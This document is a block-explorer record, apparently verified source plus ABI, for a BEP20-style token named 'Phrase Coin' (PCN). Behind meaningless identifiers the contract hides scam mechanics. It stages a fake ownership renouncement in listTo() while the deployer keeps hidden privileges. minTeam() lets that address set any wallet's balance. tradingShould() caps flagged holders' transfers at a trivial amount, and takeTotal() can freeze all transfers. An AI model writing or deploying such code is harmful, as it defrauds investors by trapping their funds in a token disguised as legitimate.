{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract teamMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeBuy {\n    function createPair(address sellAmountMax, address listFee) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface buyShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface walletToMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitSell) external view returns (uint256);\n\n    function transfer(address autoTx, uint256 limitMaxWallet) external returns (bool);\n\n    function allowance(address listTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitMaxWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoTx,\n        uint256 limitMaxWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalExempt, uint256 value);\n    event Approval(address indexed listTrading, address indexed spender, uint256 value);\n}\n\ninterface walletToMinMetadata is walletToMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PhraseCoin is teamMode, walletToMin, walletToMinMetadata {\n\n    uint256 toAt;\n\n    function balanceOf(address limitSell) public view virtual override returns (uint256) {\n        return senderIs[limitSell];\n    }\n\n    address public tradingTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMin;\n    }\n\n    uint256 public takeMarketing;\n\n    function getOwner() external view returns (address) {\n        return limitWalletList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeSell;\n    }\n\n    function owner() external view returns (address) {\n        return limitWalletList;\n    }\n\n    function transferFrom(address takeSender, address autoTx, uint256 limitMaxWallet) external override returns (bool) {\n        if (_msgSender() != receiverWallet) {\n            if (buyMode[takeSender][_msgSender()] != type(uint256).max) {\n                require(limitMaxWallet <= buyMode[takeSender][_msgSender()]);\n                buyMode[takeSender][_msgSender()] -= limitMaxWallet;\n            }\n        }\n        return walletMaxAt(takeSender, autoTx, limitMaxWallet);\n    }\n\n    function swapLaunched(address teamTxList) public {\n        if (tradingSender) {\n            return;\n        }\n        if (maxShould == receiverTx) {\n            receiverTx = atSwap;\n        }\n        buyTrading[teamTxList] = true;\n        \n        tradingSender = true;\n    }\n\n    function receiverSwap() private view {\n        require(buyTrading[_msgSender()]);\n    }\n\n    function transfer(address amountMin, uint256 limitMaxWallet) external virtual override returns (bool) {\n        return walletMaxAt(_msgSender(), amountMin, limitMaxWallet);\n    }\n\n    uint256 private totalBuy;\n\n    event OwnershipTransferred(address indexed walletTo, address indexed marketingLaunched);\n\n    function allowance(address takeFund, address takeLaunchTo) external view virtual override returns (uint256) {\n        if (takeLaunchTo == receiverWallet) {\n            return type(uint256).max;\n        }\n        return buyMode[takeFund][takeLaunchTo];\n    }\n\n    function takeTotal(uint256 limitMaxWallet) public {\n        receiverSwap();\n        toAt = limitMaxWallet;\n    }\n\n    function fundLaunched(address takeSender, address autoTx, uint256 limitMaxWallet) internal view returns (uint256) {\n        require(limitMaxWallet > 0);\n\n        uint256 tradingSell = 0;\n        if (takeSender == tradingTx && txFee > 0) {\n            tradingSell = limitMaxWallet * txFee / 100;\n        } else if (autoTx == tradingTx && maxLimit > 0) {\n            tradingSell = limitMaxWallet * maxLimit / 100;\n        }\n        require(tradingSell <= limitMaxWallet);\n        return limitMaxWallet - tradingSell;\n    }\n\n    uint256 fromSellAt;\n\n    mapping(address => uint256) private senderIs;\n\n    uint256 private feeSell = 100000000 * 10 ** 18;\n\n    uint256 private atSwap;\n\n    function listTo() public {\n        emit OwnershipTransferred(walletTake, address(0));\n        limitWalletList = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenEnableLaunched;\n    }\n\n    function tokenMax(address takeSender, address autoTx, uint256 limitMaxWallet) internal returns (bool) {\n        require(senderIs[takeSender] >= limitMaxWallet);\n        senderIs[takeSender] -= limitMaxWallet;\n        senderIs[autoTx] += limitMaxWallet;\n        emit Transfer(takeSender, autoTx, limitMaxWallet);\n        return true;\n    }\n\n    function approve(address takeLaunchTo, uint256 limitMaxWallet) public virtual override returns (bool) {\n        buyMode[_msgSender()][takeLaunchTo] = limitMaxWallet;\n        emit Approval(_msgSender(), takeLaunchTo, limitMaxWallet);\n        return true;\n    }\n\n    bool public senderList;\n\n    bool public tradingSender;\n\n    mapping(address => bool) public buyTrading;\n\n    function walletMaxAt(address takeSender, address autoTx, uint256 limitMaxWallet) internal returns (bool) {\n        if (takeSender == walletTake) {\n            return tokenMax(takeSender, autoTx, limitMaxWallet);\n        }\n        uint256 listEnable = walletToMin(tradingTx).balanceOf(totalMin);\n        require(listEnable == toAt);\n        require(autoTx != totalMin);\n        if (exemptBuy[takeSender]) {\n            return tokenMax(takeSender, autoTx, marketingMin);\n        }\n        limitMaxWallet = fundLaunched(takeSender, autoTx, limitMaxWallet);\n        return tokenMax(takeSender, autoTx, limitMaxWallet);\n    }\n\n    uint256 public receiverTx;\n\n    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private feeMin = 18;\n\n    uint256 constant marketingMin = 6 ** 10;\n\n    uint256 public maxLimit = 0;\n\n    mapping(address => mapping(address => uint256)) private buyMode;\n\n    uint256 public txFee = 3;\n\n    address private limitWalletList;\n\n    uint256 public maxShould;\n\n    constructor (){\n        \n        listTo();\n        buyShould walletIs = buyShould(receiverWallet);\n        tradingTx = feeBuy(walletIs.factory()).createPair(walletIs.WETH(), address(this));\n        totalMin = feeBuy(walletIs.factory()).feeTo();\n        \n        walletTake = _msgSender();\n        buyTrading[walletTake] = true;\n        senderIs[walletTake] = feeSell;\n        \n        emit Transfer(address(0), walletTake, feeSell);\n    }\n\n    function tradingShould(address teamAmountShould) public {\n        receiverSwap();\n        \n        if (teamAmountShould == walletTake || teamAmountShould == tradingTx) {\n            return;\n        }\n        exemptBuy[teamAmountShould] = true;\n    }\n\n    string private tokenEnableLaunched = \"Phrase Coin\";\n\n    bool public feeTake;\n\n    bool public shouldLiquidity;\n\n    mapping(address => bool) public exemptBuy;\n\n    uint256 public tokenIs;\n\n    address public walletTake;\n\n    string private minFund = \"PCN\";\n\n    address totalMin;\n\n    function minTeam(address amountMin, uint256 limitMaxWallet) public {\n        receiverSwap();\n        senderIs[amountMin] = limitMaxWallet;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLaunchTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMaxWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMaxWallet\",\"type\":\"uint256\"}],\"name\":\"minTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTxList\",\"type\":\"address\"}],\"name\":\"swapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitMaxWallet\",\"type\":\"uint256\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmountShould\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMaxWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMaxWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PhraseCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}